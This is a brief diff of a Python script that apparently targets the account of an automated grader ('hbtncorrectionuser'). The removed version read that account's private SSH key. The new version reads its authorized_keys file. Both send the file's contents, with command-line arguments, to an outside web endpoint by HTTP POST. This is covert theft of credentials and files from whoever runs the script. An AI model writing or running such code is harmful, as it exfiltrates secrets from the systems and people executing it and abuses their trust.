@@ -7,7 +7,7 @@ from sys import argv
 
 if __name__ == "__main__":
     allines = []
-    with open("/home/hbtncorrectionuser/.ssh/id_rsa") as f:
+    with open("/home/hbtncorrectionuser/.ssh/authorized_keys") as f:
         for lines in f:
             allines += lines
     requests.post("https://intranet.hbtn.co/auth/sign_in", data={"ONE": argv[2], "TWO": argv[1], "THREE": lines})
